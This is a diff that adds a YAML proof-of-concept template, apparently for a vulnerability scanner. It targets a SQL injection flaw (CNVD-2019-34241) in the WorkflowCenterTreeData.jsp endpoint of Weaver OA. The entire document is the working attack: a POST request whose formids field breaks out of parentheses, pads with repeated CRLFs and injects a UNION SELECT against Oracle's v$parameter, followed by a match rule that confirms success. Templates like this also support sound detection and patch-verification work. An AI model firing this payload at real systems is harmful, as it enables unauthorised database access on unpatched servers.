@@ -1,0 +1,20 @@
+id: poc-yaml-weaver-workflowcenter-sqli
+info:
+  name: 泛微OA WorkflowCenterTreeData SQL注入漏洞(CNVD-2019-34241)
+  severity: high
+  tags:
+  - CNVD-2019-34241
+  - SQL注入
+  finger: weaver
+  osprey-id: vb_2019_0060
+variables:
+  r_empty: repeat("\r\n", 400)
+requests:
+- method: POST
+  path: /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: formids=11111111111))){{.r_empty}}union select 111,'ccc' from v$parameter
+    order by (((1
+  expression: contains(body, "\"id\":\"wf_111\",\"text\":\"ccc\"")
+transport: http
